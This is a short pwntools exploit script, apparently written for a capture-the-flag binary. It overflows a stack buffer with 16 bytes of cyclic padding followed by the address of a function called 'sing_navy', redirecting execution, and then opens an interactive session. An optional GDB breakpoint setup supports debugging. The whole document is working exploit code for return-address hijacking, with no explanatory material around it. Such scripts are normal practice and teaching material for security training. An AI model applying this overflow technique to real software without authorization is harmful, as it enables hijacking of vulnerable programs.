from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x4009c4
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

# stage1: sing usna alma mater
payload = cyclic(16)
payload += p64(e.sym['sing_navy'])
payload += cyclic(256)

p.sendline(payload)
p.interactive()
